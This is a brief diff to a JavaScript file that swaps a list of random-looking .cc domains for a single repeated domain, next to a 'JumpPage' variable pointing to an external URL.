@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
-	'viwjashp.cc/', 
-	'vukynvfrj.cc/', 
-    'nwpsfgaj.cc/',
+	'mrrcvguw.cc/', 
+	'mrrcvguw.cc/', 
+    'mrrcvguw.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://91hlw1.net";
